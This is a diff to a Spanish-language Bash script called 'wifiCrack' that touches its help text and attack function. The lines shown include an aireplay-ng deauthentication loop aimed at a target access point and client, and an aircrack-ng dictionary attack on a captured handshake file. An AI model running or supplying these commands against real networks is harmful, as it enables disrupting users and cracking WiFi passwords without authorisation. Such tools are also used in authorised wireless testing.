@@ -17,7 +17,7 @@ function ctrl_c(){
 
 function ayuda(){
 	echo -e "\n[*] Uso: wifiCrack -t Tarjeta_de_Red -w Dirección_de_WordList"
-	echo -e "\n[*] Las capturas se almacenarán en la carpeta que usted se ubique. Si quieres que se almacene en otro lugar, favor de cancelar el proceso con ctrl_c. Se recomienda crear y dirigirse a una carpeta expecífica y estar cerca de WiFi para realizar el ataque sin problemas."
+	echo -e "\n[*] Las capturas se almacenarán en la carpeta que usted se ubique. Se recomienda crear y dirigirse a una carpeta expecífica y estar cerca del WiFi para realizar el ataque sin problemas."
 }
 
 function dependencias(){
@@ -80,7 +80,6 @@ function ataque(){
 	
 	tput cnorm
 	while :; do
-		#Aquí replay; dudo que se necesite xterm
 		xterm -hold -e "aireplay-ng -0 10 -a $apMac -c $apMac2 ${tarjeta}mon" &
 		aireplay_xterm_PID=$!
 		sleep 15
@@ -98,7 +97,7 @@ function ataque(){
 	
 	airmon-ng stop ${tarjeta}mon > /dev/null 2>&1
 
-	xterm -hold -e "aircrack-ng -w $wordListPath Captura-01.cap" &
+	aircrack-ng -w $wordListPath Captura-01.cap
 }
 
 # Main
